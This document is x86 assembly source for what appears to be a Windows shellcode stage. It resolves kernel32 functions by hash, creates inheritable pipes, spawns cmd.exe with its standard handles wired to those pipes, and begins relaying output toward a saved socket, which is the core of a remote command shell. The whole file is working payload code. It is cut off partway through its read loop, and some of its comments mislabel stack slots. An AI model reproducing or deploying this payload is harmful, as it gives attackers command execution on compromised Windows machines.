BITS 32

%include "_kernel32_init.asm"

push edi                          ; save socket

; initalize kernel32 stuffs..
KERNEL32_INIT

; ebx = kernel32.dll base
; esi = LGetProcAddress
; edi = LoadLibraryA


DIRECTION_CLD
push ebx
push esi
push edi
sub esp, 16                       ; make room for handles
                                  ; pipe1 write, pipe1 read, pipe2 write, read
mov esi, esp
mov ebp, esp

; [ebp + 28] = socket
; [ebp + 24] = kernel32.dll base
; [ebp + 20] = LGetProcAddress
; [ebp + 16] = LoadLibraryA
; [ebp + 12] = Pipe2 ReadHandle
; [ebp +  8] = Pipe2 WriteHandle
; [ebp +  4] = Pipe1 ReadHandle
; [ebp +  0] = Pipe2 WriteHandle

push BYTE 0x01                    ; inheritable
push BYTE 0x00                    ; null SecurityDescriptor
push BYTE 12                      ; length (12)
mov ecx, esp                      ; PipeAttributes ptr

make_pipe1:
  push BYTE 0x00                    ; buffer size (0, default)
  push ecx                          ; PipeAttributes
  push esi                          ; pipe1 WriteHandle
  lodsd
  push esi                          ; pipe1 ReadHandle
  lodsd
  
  push ebx                          ; push kernel32 base
  HASH push, 'CreatePipe'           ; push hash
  call [ebp + 20]                   ; LGetProcAddress('CreatePipe', kernel32)
  mov edi, eax                      ; save CreatePipe
  call eax                          ; CreatePipe()

make_pipe2:
  mov eax, esp                      ; PipeAttributes ptr
  push BYTE 0x00                    ; BufferSize
  push eax                          ; PipeAttributes
  push esi                          ; pipe2 WriteHandle
  lodsd
  push esi                          ; pipe2 ReadHandle
  
  call edi                          ; CreatePipe()


; stole HD code
LSetCommand:
  push "CMD"
  mov edx, esp
  
LCreateProcessStructs:
  xor eax,eax         ; overwrite with null
  lea edi, [edx-84]   ; struct sizes
  push byte 21        ; 21 * 4 = 84
  pop ecx             ; set counter

LBZero:
  rep stosd           ; overwrite with null
      
LCreateStructs:
  sub esp, 84
  mov byte [edx - 84 + 16], 68	    ; si.cb = sizeof(si) 
  mov word [edx - 84 + 60], 0x0101 ; si.dwflags

  DIRECTION_STD                     ; switch direction
  lodsd                             ; esi = pipe2 WriteHandle
    
  ; socket handles 
  mov [edx - 84 + 16 + 64], esi          ; pipe2 stderr
  mov [edx - 84 + 16 + 60], esi          ; pipe2 stdout
  lodsd                                  ; at pipe1 ReadHandle
  mov [edx - 84 + 16 + 56], esi          ; pipe1 stdin

  DIRECTION_CLD

  lea eax, [edx - 84 + 16] ; si 
  push esp                 ; pi 
  push eax
  push ecx
  push ecx
  push ecx

  inc ecx
  push ecx
  dec ecx
    
  push ecx
  push ecx
  push edx
  push ecx
  
LCreateProcessA:
  push ebx                        ; kernel32 base
  HASH push, 'CreateProcessA'     ; CreateProcessA
  call [ebp + 20]
  call eax                        ; CreateProcessA()

  add esp, -128                   ; make buffer space (124 char, 4 numRead)
  mov ecx, esp
  pop eax
  mov edi, esp

read_stdout:                      ; read on pipe2
  push BYTE 0x00                  ; lpOverlapped
  push ecx                        ; numRead
  push BYTE 5                     ; numToRead
  push edi                        ; buffer
  push DWORD [ebp + 12]           ; Pipe2 ReadHandle
  push ebx                        ; kernel32 base
  HASH push, 'ReadFile'           ; ReadFile
  call [ebp + 20]                 ; LGetProcAddress
  call eax                        ; ReadFile()
